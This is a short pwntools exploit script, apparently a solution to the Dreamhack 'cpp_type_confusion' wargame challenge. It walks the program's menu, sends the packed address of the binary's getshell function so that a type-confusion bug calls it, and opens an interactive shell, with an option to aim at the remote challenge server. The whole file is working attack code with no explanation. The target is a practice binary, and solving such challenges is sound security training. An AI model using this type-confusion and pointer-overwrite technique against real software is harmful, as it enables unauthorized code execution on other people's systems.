#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./cpp_type_confusion', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 16604)
    else:
        return process(elf.path)

io = start()

sl(b'1')
sl(b'2')
sl(b'3')
sl(p32(elf.sym['_Z8getshellv']))
sl(b'4')
sl(b'3')

io.interactive()